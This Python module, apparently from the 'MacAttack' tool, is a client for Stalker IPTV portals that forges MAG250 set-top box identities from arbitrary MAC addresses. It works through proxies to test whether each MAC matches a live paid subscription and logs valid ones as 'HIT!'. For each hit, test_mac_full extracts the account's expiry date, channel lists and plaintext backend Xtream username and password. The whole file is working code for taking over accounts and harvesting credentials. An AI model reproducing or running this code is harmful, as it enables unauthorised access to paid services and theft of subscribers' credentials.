"""
STB (Set-Top Box) API Client for Stalker Portals
Handles authentication, token management, and API requests
Based on original MacAttack implementation
"""
import requests
from requests.adapters import HTTPAdapter, Retry
from urllib.parse import urlparse, quote
import urllib.parse
import re
import logging
import time
import hashlib
import json

logger = logging.getLogger("MacAttack.stb")
logger.setLevel(logging.DEBUG)

# Session management
_sessions = {}  # Per-proxy sessions
_SESSION_MAX_AGE = 300


def _get_session(proxy=None):
    """Get or create a requests session for a specific proxy."""
    global _sessions
    
    proxy_key = proxy or "direct"
    current_time = time.time()
    
    if proxy_key in _sessions:
        session, created = _sessions[proxy_key]
        if (current_time - created) < _SESSION_MAX_AGE:
            return session
        else:
            try:
                session.close()
            except:
                pass
    
    session = requests.Session()
    retries = Retry(total=2, backoff_factor=0.1, status_forcelist=[500, 502, 503, 504])
    session.mount("http://", HTTPAdapter(max_retries=retries))
    session.mount("https://", HTTPAdapter(max_retries=retries))
    
    _sessions[proxy_key] = (session, current_time)
    return session


def parse_proxy(proxy_str):
    """
    Parse proxy string and return requests-compatible proxy dict.
    Supports: HTTP, SOCKS4, SOCKS5
    Formats:
        - ip:port (HTTP)
        - http://ip:port
        - socks4://ip:port
        - socks5://ip:port
        - socks5://user:pass@ip:port
    """
    if not proxy_str:
        return None
    
    proxy_str = proxy_str.strip()
    
    # Detect proxy type
    if proxy_str.startswith("socks5://"):
        return {
            "http": proxy_str,
            "https": proxy_str
        }
    elif proxy_str.startswith("socks4://"):
        return {
            "http": proxy_str,
            "https": proxy_str
        }
    elif proxy_str.startswith("http://"):
        return {
            "http": proxy_str,
            "https": proxy_str
        }
    else:
        # Assume HTTP proxy (ip:port format)
        return {
            "http": f"http://{proxy_str}",
            "https": f"http://{proxy_str}"
        }


def _generate_device_ids(mac):
    """Generate device IDs based on MAC address - matches original MacAttack."""
    serialnumber = hashlib.md5(mac.encode()).hexdigest().upper()
    sn = serialnumber[0:13]
    device_id = hashlib.sha256(sn.encode()).hexdigest().upper()
    device_id2 = hashlib.sha256(mac.encode()).hexdigest().upper()
    hw_version_2 = hashlib.sha1(mac.encode()).hexdigest()
    snmac = f"{sn}{mac}"
    sig = hashlib.sha256(snmac.encode()).hexdigest().upper()
    return sn, device_id, device_id2, hw_version_2, sig


def _normalize_url(url):
    """Normalize URL - remove trailing slashes to prevent double slashes."""
    return url.rstrip('/')


def auto_detect_portal_url(base_url, proxy=None, timeout=10):
    """
    Auto-detect portal endpoint from base URL.
    User can enter just http://host:port and this will find the correct endpoint.
    
    Checks endpoints in order (exactly like original MacAttack):
    1. /c/ (standard portal) -> portal.php
    2. /stalker_portal/c/ (stalker portal) -> stalker_portal/server/load.php
    
    Returns: (full_url, portal_type, version) or (None, None, None) if not found
    """
    base_url = _normalize_url(base_url)
    parsed = urlparse(base_url)
    host = parsed.hostname
    port = parsed.port or 80
    scheme = parsed.scheme or "http"
    
    # If URL already has /c/ path, return as-is
    if '/c' in parsed.path:
        portal_type, version = detect_portal_type(base_url, proxy)
        return base_url, portal_type, version
    
    # Build clean base URL
    clean_base = f"{scheme}://{host}:{port}"
    
    headers = _get_headers()
    proxies = parse_proxy(proxy)
    session = _get_session(proxy)
    
    # Endpoints to check - EXACTLY like original MacAttack (only these 2)
    endpoints = [
        ("/c/", "portal.php"),
        ("/stalker_portal/c/", "stalker_portal/server/load.php"),
    ]
    
    for endpoint, default_portal_type in endpoints:
        version_url = f"{clean_base}{endpoint}version.js"
        try:
            response = session.get(version_url, headers=headers, proxies=proxies, timeout=timeout)
            if response.status_code == 200:
                match = re.search(r"var ver = ['\"](.*?)['\"];", response.text)
                if match:
                    version = match.group(1)
                    full_url = f"{clean_base}{endpoint.rstrip('/')}"
                    logger.info(f"Auto-detected portal: {full_url} (version: {version})")
                    return full_url, default_portal_type, version
        except Exception as e:
            logger.debug(f"Endpoint {endpoint} not found: {e}")
            continue
    
    # Fallback: return with /c/ and let it fail gracefully
    logger.warning(f"No portal endpoint auto-detected for {base_url}, defaulting to /c/")
    return f"{clean_base}/c", "portal.php", "5.3.1"


def _get_cookies(mac):
    """Generate cookies for STB emulation - matches original MacAttack."""
    sn, device_id, device_id2, hw_version_2, sig = _generate_device_ids(mac)
    return {
        "adid": hw_version_2,
        "debug": "1",
        "device_id2": device_id2,
        "device_id": device_id,
        "hw_version": "1.7-BD-00",
        "mac": mac,
        "sn": sn,
        "stb_lang": "en",
        "timezone": "America/Los_Angeles",
    }


def _get_headers(token=None, token_random=None):
    """Generate headers for STB emulation - matches original MacAttack."""
    headers = {
        "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
        "Accept-Encoding": "identity",
        "Accept": "*/*",
        "Connection": "keep-alive",
    }
    if token:
        headers["Authorization"] = f"Bearer {token}"
    if token_random:
        headers["X-Random"] = str(token_random)
    return headers


def detect_portal_type(url, proxy=None):
    """Detect the portal type (portal.php or stalker_portal) - matches original."""
    url = _normalize_url(url)
    parsed_url = urlparse(url)
    parsed_path = parsed_url.path
    
    if parsed_path.endswith("c"):
        parsed_path = parsed_path[:-1]
    if parsed_path.endswith("c/"):
        parsed_path = parsed_path[:-2]
    
    host = parsed_url.hostname
    port = parsed_url.port or 80
    scheme = parsed_url.scheme or "http"
    base_url = f"{scheme}://{host}:{port}"
    
    headers = _get_headers()
    proxies = parse_proxy(proxy)
    session = _get_session(proxy)
    
    # Check for type portal
    try:
        version_url = f"{base_url}/c/version.js"
        response = session.get(version_url, headers=headers, proxies=proxies, timeout=10)
        if response.status_code == 200:
            match = re.search(r"var ver = ['\"](.*?)['\"];", response.text)
            if match:
                logger.info(f"Portal type: PORTAL version: {match.group(1)}")
                return "portal.php", match.group(1)
    except Exception as e:
        logger.debug(f"Not type PORTAL: {e}")
    
    # Check for stalker_portal
    try:
        version_url = f"{base_url}/stalker_portal/c/version.js"
        response = session.get(version_url, headers=headers, proxies=proxies, timeout=10)
        if response.status_code == 200:
            match = re.search(r"var ver = ['\"](.*?)['\"];", response.text)
            if match:
                logger.info(f"Portal type: STALKER_PORTAL version: {match.group(1)}")
                return "stalker_portal/server/load.php", match.group(1)
    except Exception as e:
        logger.debug(f"Not type STALKER_PORTAL: {e}")
    
    # Default to portal.php
    return "portal.php", "5.3.1"


def get_token(url, mac, proxy=None, timeout=30):
    """
    Get authentication token from portal.
    Includes X-Random header handling like original MacAttack.
    """
    # Normalize URL - remove trailing slash
    url = url.rstrip('/')
    
    parsed_url = urlparse(url)
    parsed_path = parsed_url.path
    
    if parsed_path.endswith("c"):
        parsed_path = parsed_path[:-1]
    if parsed_path.endswith("c/"):
        parsed_path = parsed_path[:-2]
    
    host = parsed_url.hostname
    port = parsed_url.port or 80
    scheme = parsed_url.scheme or "http"
    
    portal_type, portal_version = detect_portal_type(url, proxy)
    
    # Build base URL
    base_url = f"{scheme}://{host}:{port}{parsed_path}"
    
    # Fix double stalker_portal
    if "stalker_portal/" in base_url and "stalker_portal/" in portal_type:
        base_url = base_url.replace("stalker_portal/", "")
    
    # Build handshake URL - ensure no double slashes
    handshake_url = f"{url}/{portal_type}?action=handshake&type=stb&token=&JsHttpRequest=1-xml"
    
    try:
        session = _get_session(proxy)
        sn, device_id, device_id2, hw_version_2, sig = _generate_device_ids(mac)
        
        cookies = {
            "adid": hw_version_2,
            "debug": "1",
            "device_id2": device_id2,
            "device_id": device_id,
            "hw_version": "1.7-BD-00",
            "mac": mac,
            "sn": sn,
            "stb_lang": "en",
            "timezone": "America/Los_Angeles",
        }
        
        headers = {
            "Connection": "keep-alive",
            "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
            "Accept-Encoding": "identity",
            "Accept": "*/*",
        }
        
        proxies = parse_proxy(proxy)
        response = session.get(handshake_url, cookies=cookies, headers=headers, proxies=proxies, timeout=timeout)
        logger.debug(f"Handshake response: {response.text[:500]}")
        response.raise_for_status()
        
        data = response.json()
        token = data.get("js", {}).get("token")
        token_random = data.get("js", {}).get("random")
        
        if token:
            # Handle X-Random like original MacAttack
            if token_random:
                logger.debug(f"RANDOM: {token_random}")
                sig = hashlib.sha256(str(token_random).encode()).hexdigest().upper()
                
                metrics = {
                    "mac": mac,
                    "sn": sn,
                    "type": "STB",
                    "model": "MAG250",
                    "uid": device_id,
                    "random": token_random,
                }
                json_string = json.dumps(metrics)
                encoded_string = urllib.parse.quote(json_string)
                
                # Update session headers for subsequent requests
                session.headers.update({
                    "Connection": "keep-alive",
                    "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
                    "Accept-Encoding": "identity",
                    "Accept": "*/*",
                    "Authorization": f"Bearer {token}",
                    "X-Random": str(token_random),
                })
                
                session.cookies.update(cookies)
                
                # Get profile with metrics (like original)
                profile_url = (
                    f"{url}/{portal_type}?type=stb&action=get_profile&hd=1"
                    f"&ver=ImageDescription: 0.2.18-r23-250; ImageDate: Wed Aug 29 10:49:53 EEST 2018; "
                    f"PORTAL version: {portal_version}; API Version: JS API version: 343; "
                    f"STB API version: 146; Player Engine version: 0x58c"
                    f"&num_banks=2&sn={sn}&stb_type=MAG250&client_type=STB&image_version=218"
                    f"&video_out=hdmi&device_id={device_id2}&device_id2={device_id2}"
                    f"&sig={sig}&auth_second_step=1&hw_version=1.7-BD-00"
                    f"&not_valid_token=0&metrics={encoded_string}&hw_version_2={hw_version_2}"
                    f"&timestamp={round(time.time())}&api_sig=262&prehash=0"
                )
                try:
                    session.get(profile_url, proxies=proxies, timeout=timeout)
                except:
                    pass
            
            logger.info(f"Token retrieved for MAC {mac}")
            return token, token_random, portal_type, portal_version
        
        logger.error("Token not found in handshake response")
        return None, None, None, None
        
    except Exception as e:
        logger.error(f"Error getting token: {e}")
        return None, None, None, None


def get_profile(url, mac, token, portal_type, token_random=None, proxy=None):
    """Get account profile information."""
    url = _normalize_url(url)
    try:
        session = _get_session(proxy)
        cookies = _get_cookies(mac)
        cookies["token"] = token
        headers = _get_headers(token, token_random)
        proxies = parse_proxy(proxy)
        
        profile_url = f"{url}/{portal_type}?type=stb&action=get_profile&JsHttpRequest=1-xml"
        response = session.get(profile_url, cookies=cookies, headers=headers, proxies=proxies, timeout=15)
        response.raise_for_status()
        
        return response.json().get("js", {})
    except Exception as e:
        logger.error(f"Error getting profile: {e}")
        return {}


def get_account_info(url, mac, token, portal_type, token_random=None, proxy=None):
    """Get account expiration info."""
    url = _normalize_url(url)
    try:
        session = _get_session(proxy)
        cookies = _get_cookies(mac)
        cookies["token"] = token
        headers = _get_headers(token, token_random)
        proxies = parse_proxy(proxy)
        
        info_url = f"{url}/{portal_type}?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
        response = session.get(info_url, cookies=cookies, headers=headers, proxies=proxies, timeout=15)
        response.raise_for_status()
        
        return response.json().get("js", {})
    except Exception as e:
        logger.error(f"Error getting account info: {e}")
        return {}


def get_genres(url, mac, token, portal_type, token_random=None, proxy=None):
    """Get live TV genres/categories."""
    url = _normalize_url(url)
    try:
        session = _get_session(proxy)
        cookies = _get_cookies(mac)
        cookies["token"] = token
        headers = _get_headers(token, token_random)
        proxies = parse_proxy(proxy)
        
        genres_url = f"{url}/{portal_type}?type=itv&action=get_genres&JsHttpRequest=1-xml"
        response = session.get(genres_url, cookies=cookies, headers=headers, proxies=proxies, timeout=15)
        response.raise_for_status()
        
        return response.json().get("js", [])
    except Exception as e:
        logger.error(f"Error getting genres: {e}")
        return []


def get_vod_categories(url, mac, token, portal_type, token_random=None, proxy=None):
    """Get VOD categories."""
    url = _normalize_url(url)
    try:
        session = _get_session(proxy)
        cookies = _get_cookies(mac)
        cookies["token"] = token
        headers = _get_headers(token, token_random)
        proxies = parse_proxy(proxy)
        
        vod_url = f"{url}/{portal_type}?type=vod&action=get_categories&JsHttpRequest=1-xml"
        response = session.get(vod_url, cookies=cookies, headers=headers, proxies=proxies, timeout=15)
        response.raise_for_status()
        
        return response.json().get("js", [])
    except Exception as e:
        logger.error(f"Error getting VOD categories: {e}")
        return []


def get_series_categories(url, mac, token, portal_type, token_random=None, proxy=None):
    """Get series categories."""
    url = _normalize_url(url)
    try:
        session = _get_session(proxy)
        cookies = _get_cookies(mac)
        cookies["token"] = token
        headers = _get_headers(token, token_random)
        proxies = parse_proxy(proxy)
        
        series_url = f"{url}/{portal_type}?type=series&action=get_categories&JsHttpRequest=1-xml"
        response = session.get(series_url, cookies=cookies, headers=headers, proxies=proxies, timeout=15)
        response.raise_for_status()
        
        return response.json().get("js", [])
    except Exception as e:
        logger.error(f"Error getting series categories: {e}")
        return []


def get_channels(url, mac, token, portal_type, category_type, category_id, token_random=None, proxy=None, page=0):
    """Get channels/items from a category."""
    url = _normalize_url(url)
    try:
        session = _get_session(proxy)
        cookies = _get_cookies(mac)
        cookies["token"] = token
        headers = _get_headers(token, token_random)
        proxies = parse_proxy(proxy)
        
        if category_type == "IPTV":
            channels_url = f"{url}/{portal_type}?type=itv&action=get_ordered_list&genre={category_id}&JsHttpRequest=1-xml&p={page}"
        elif category_type == "VOD":
            channels_url = f"{url}/{portal_type}?type=vod&action=get_ordered_list&category={category_id}&JsHttpRequest=1-xml&p={page}"
        elif category_type == "Series":
            channels_url = f"{url}/{portal_type}?type=series&action=get_ordered_list&category={category_id}&p={page}&JsHttpRequest=1-xml"
        else:
            return [], 0
        
        response = session.get(channels_url, cookies=cookies, headers=headers, proxies=proxies, timeout=15)
        response.raise_for_status()
        
        data = response.json().get("js", {})
        channels = data.get("data", [])
        total_items = int(data.get("total_items", 0))
        
        return channels, total_items
    except Exception as e:
        logger.error(f"Error getting channels: {e}")
        return [], 0


def get_stream_url(url, mac, token, portal_type, cmd, token_random=None, proxy=None):
    """Get stream URL for a channel."""
    url = _normalize_url(url)
    try:
        session = _get_session(proxy)
        cookies = _get_cookies(mac)
        cookies["token"] = token
        headers = _get_headers(token, token_random)
        proxies = parse_proxy(proxy)
        
        stream_url = f"{url}/{portal_type}?type=itv&action=create_link&cmd={quote(cmd)}&JsHttpRequest=1-xml"
        response = session.get(stream_url, cookies=cookies, headers=headers, proxies=proxies, timeout=15)
        response.raise_for_status()
        
        data = response.json().get("js", {})
        cmd_result = data.get("cmd", "")
        
        if cmd_result:
            parts = cmd_result.split(" ")
            if len(parts) > 1:
                return parts[-1]
            return cmd_result
        
        return None
    except Exception as e:
        logger.error(f"Error getting stream URL: {e}")
        return None


def get_vod_stream_url(url, mac, token, portal_type, cmd, token_random=None, proxy=None):
    """Get stream URL for VOD content."""
    url = _normalize_url(url)
    try:
        session = _get_session(proxy)
        cookies = _get_cookies(mac)
        cookies["token"] = token
        headers = _get_headers(token, token_random)
        proxies = parse_proxy(proxy)
        
        stream_url = f"{url}/{portal_type}?type=vod&action=create_link&cmd={quote(cmd)}&JsHttpRequest=1-xml"
        response = session.get(stream_url, cookies=cookies, headers=headers, proxies=proxies, timeout=15)
        response.raise_for_status()
        
        data = response.json().get("js", {})
        cmd_result = data.get("cmd", "")
        
        if cmd_result:
            parts = cmd_result.split(" ")
            if len(parts) > 1:
                return parts[-1]
            return cmd_result
        
        return None
    except Exception as e:
        logger.error(f"Error getting VOD stream URL: {e}")
        return None


def test_mac(url, mac, proxy=None, timeout=15):
    """Test if a MAC address is valid on a portal - EXACTLY like original MacAttack."""
    url = _normalize_url(url)
    try:
        token, token_random, portal_type, portal_version = get_token(url, mac, proxy, timeout)
        
        if not token:
            return False, None, "No token"
        
        # Get profile first (like original) - this activates the session
        profile = get_profile(url, mac, token, portal_type, token_random, proxy)
        
        # Extract expire_billing_date and client_ip from profile if available (like original)
        exp_billing = None
        client_ip = None
        if profile and isinstance(profile, dict):
            exp_billing = profile.get("expire_billing_date")
            client_ip = profile.get("ip")
            # Convert expire_billing_date format like original
            if exp_billing:
                try:
                    from datetime import datetime as dt
                    dt_object = dt.strptime(exp_billing, "%Y-%m-%d %H:%M:%S")
                    exp_billing = dt_object.strftime("%B %d, %Y, %I:%M %p")
                except (ValueError, TypeError):
                    pass
        
        # Get account info - this is where we check validity (EXACTLY like original)
        account_info = get_account_info(url, mac, token, portal_type, token_random, proxy)
        
        # Original MacAttack checks: "mac" in data["js"] AND "phone" in data["js"]
        if account_info and isinstance(account_info, dict):
            acc_mac = account_info.get("mac")
            phone = account_info.get("phone")
            
            # EXACTLY like original: both mac AND phone must be present
            if acc_mac is not None and phone is not None:
                expiry = phone
                
                # If phone is empty string, use expire_billing_date (like original)
                if expiry == "":
                    expiry = "Unknown"
                    if exp_billing:
                        expiry = exp_billing
                
                # Try to convert Unix timestamp to readable date (like original)
                try:
                    timestamp = int(expiry)
                    from datetime import datetime as dt
                    expiry = dt.utcfromtimestamp(timestamp).strftime("%B %d, %Y, %I:%M %p")
                except (ValueError, TypeError):
                    # If it fails, it's already in human-readable format
                    pass
                
                logger.info(f"HIT! MAC: {mac} - Expiry: {expiry}")
                return True, expiry, "Valid"
        
        return False, None, "No valid account info"
        
    except Exception as e:
        logger.error(f"Error testing MAC {mac}: {e}")
        return False, None, str(e)


def get_all_channels(url, mac, token, portal_type, token_random=None, proxy=None, timeout=15):
    """Get all channels count - like original MacAttack."""
    url = _normalize_url(url)
    try:
        session = _get_session(proxy)
        cookies = _get_cookies(mac)
        cookies["token"] = token
        headers = _get_headers(token, token_random)
        proxies = parse_proxy(proxy)
        
        channels_url = f"{url}/{portal_type}?type=itv&action=get_all_channels&JsHttpRequest=1-xml"
        response = session.get(channels_url, cookies=cookies, headers=headers, proxies=proxies, timeout=timeout)
        
        if response.status_code == 200:
            data = response.json()
            if isinstance(data, dict) and "js" in data and "data" in data["js"]:
                return len(data["js"]["data"])
        return 0
    except Exception as e:
        logger.error(f"Error getting all channels: {e}")
        return 0


def get_stream_info(url, mac, token, portal_type, token_random=None, proxy=None, timeout=15):
    """
    Get stream info including backend URL and credentials - like original MacAttack.
    Returns: (backend_url, username, password) or (None, None, None)
    """
    url = _normalize_url(url)
    try:
        session = _get_session(proxy)
        cookies = _get_cookies(mac)
        cookies["token"] = token
        headers = _get_headers(token, token_random)
        proxies = parse_proxy(proxy)
        
        # Create link to extract backend info (like original)
        link_url = f"{url}/{portal_type}?type=itv&action=create_link&cmd=http://localhost/ch/10000_&series=&forced_storage=undefined&disable_ad=0&download=0&JsHttpRequest=1-xml"
        response = session.get(link_url, cookies=cookies, headers=headers, proxies=proxies, timeout=timeout)
        
        if response.status_code == 200:
            data = response.json()
            js_data = data.get("js", {})
            cmd_value = js_data.get("cmd")
            
            if cmd_value:
                # Clean up ffmpeg prefix like original
                cmd_value = cmd_value.replace("ffmpeg ", "", 1)
                cmd_value = cmd_value.replace("'ffmpeg' ", "")
                
                # Parse URL to extract backend and credentials
                parsed = urlparse(cmd_value)
                backend_url = f"{parsed.scheme}://{parsed.hostname}"
                if parsed.port:
                    backend_url += f":{parsed.port}"
                
                # Extract username/password from path
                path_parts = parsed.path.strip("/").split("/")
                username = None
                password = None
                if len(path_parts) >= 2:
                    username = path_parts[0]
                    password = path_parts[1]
                
                return backend_url, username, password
        
        return None, None, None
    except Exception as e:
        logger.error(f"Error getting stream info: {e}")
        return None, None, None


def get_xtream_info(backend_url, username, password, timeout=15):
    """
    Get Xtream API info - like original MacAttack.
    Returns dict with: active_cons, max_connections, created_at
    """
    try:
        xtream_url = f"{backend_url}/player_api.php?username={username}&password={password}"
        response = requests.get(xtream_url, timeout=timeout)
        
        if response.status_code == 200:
            data = response.json()
            user_info = data.get("user_info", {})
            
            result = {}
            
            if "active_cons" in user_info:
                try:
                    result["active_cons"] = int(user_info["active_cons"])
                except (ValueError, TypeError):
                    result["active_cons"] = None
            
            if "max_connections" in user_info:
                try:
                    result["max_connections"] = int(user_info["max_connections"])
                except (ValueError, TypeError):
                    result["max_connections"] = None
            
            if "created_at" in user_info:
                try:
                    from datetime import datetime as dt, timezone as tz
                    timestamp = int(user_info["created_at"])
                    result["created_at"] = dt.fromtimestamp(timestamp, tz.utc).strftime("%B %d, %Y, %I:%M %p")
                except (ValueError, TypeError):
                    result["created_at"] = None
            
            return result
        
        return {}
    except Exception as e:
        logger.error(f"Error getting Xtream info: {e}")
        return {}


def test_mac_full(url, mac, proxy=None, timeout=15):
    """
    Full MAC test - EXACTLY like original MacAttack.
    Returns all info: expiry, channels, genres, VOD, backend info, etc.
    
    Returns: (success, result_dict) where result_dict contains all collected data
    """
    url = _normalize_url(url)
    result = {
        "mac": mac,
        "portal": url,
        "expiry": None,
        "channels": 0,
        "genres": [],
        "vod_categories": [],
        "series_categories": [],
        "backend_url": None,
        "username": None,
        "password": None,
        "max_connections": None,
        "active_cons": None,
        "created_at": None,
        "client_ip": None,
    }
    
    try:
        # Step 1: Get token
        token, token_random, portal_type, portal_version = get_token(url, mac, proxy, timeout)
        
        if not token:
            return False, result
        
        # Step 2: Get profile (like original)
        profile = get_profile(url, mac, token, portal_type, token_random, proxy)
        
        exp_billing = None
        if profile and isinstance(profile, dict):
            exp_billing = profile.get("expire_billing_date")
            result["client_ip"] = profile.get("ip")
            
            if exp_billing:
                try:
                    from datetime import datetime as dt
                    dt_object = dt.strptime(exp_billing, "%Y-%m-%d %H:%M:%S")
                    exp_billing = dt_object.strftime("%B %d, %Y, %I:%M %p")
                except (ValueError, TypeError):
                    pass
        
        # Step 3: Get account info (like original)
        account_info = get_account_info(url, mac, token, portal_type, token_random, proxy)
        
        if not account_info or not isinstance(account_info, dict):
            return False, result
        
        acc_mac = account_info.get("mac")
        phone = account_info.get("phone")
        
        # Original check: both mac AND phone must be present
        if acc_mac is None or phone is None:
            return False, result
        
        # Process expiry
        expiry = phone
        if expiry == "":
            expiry = "Unknown"
            if exp_billing:
                expiry = exp_billing
        
        try:
            timestamp = int(expiry)
            from datetime import datetime as dt
            expiry = dt.utcfromtimestamp(timestamp).strftime("%B %d, %Y, %I:%M %p")
        except (ValueError, TypeError):
            pass
        
        result["expiry"] = expiry
        
        # Step 4: Get all channels count (like original)
        channels_count = get_all_channels(url, mac, token, portal_type, token_random, proxy, timeout)
        result["channels"] = channels_count
        
        # Only continue if channels > 0 (like original)
        if channels_count > 0:
            # Step 5: Get stream info for backend/credentials (like original)
            backend_url, username, password = get_stream_info(url, mac, token, portal_type, token_random, proxy, timeout)
            result["backend_url"] = backend_url
            result["username"] = username
            result["password"] = password
            
            # Step 6: Get Xtream info if credentials found (like original)
            if username and password and backend_url:
                xtream_info = get_xtream_info(backend_url, username, password, timeout)
                result["max_connections"] = xtream_info.get("max_connections")
                result["active_cons"] = xtream_info.get("active_cons")
                result["created_at"] = xtream_info.get("created_at")
            
            # Step 7: Get genres (like original)
            genres = get_genres(url, mac, token, portal_type, token_random, proxy)
            if genres:
                # Filter out "ALL" category like original
                genres = [g for g in genres if g.get("id") != "*"]
                result["genres"] = [g.get("title", "") for g in genres]
            
            # Step 8: Get VOD categories (like original)
            vod_cats = get_vod_categories(url, mac, token, portal_type, token_random, proxy)
            if vod_cats:
                result["vod_categories"] = [v.get("title", "") for v in vod_cats if isinstance(v, dict)]
            
            # Step 9: Get Series categories
            series_cats = get_series_categories(url, mac, token, portal_type, token_random, proxy)
            if series_cats:
                result["series_categories"] = [s.get("title", "") for s in series_cats if isinstance(s, dict)]
        
        logger.info(f"HIT! MAC: {mac} - Expiry: {expiry} - Channels: {channels_count}")
        return True, result
        
    except Exception as e:
        logger.error(f"Error in full MAC test for {mac}: {e}")
        return False, result
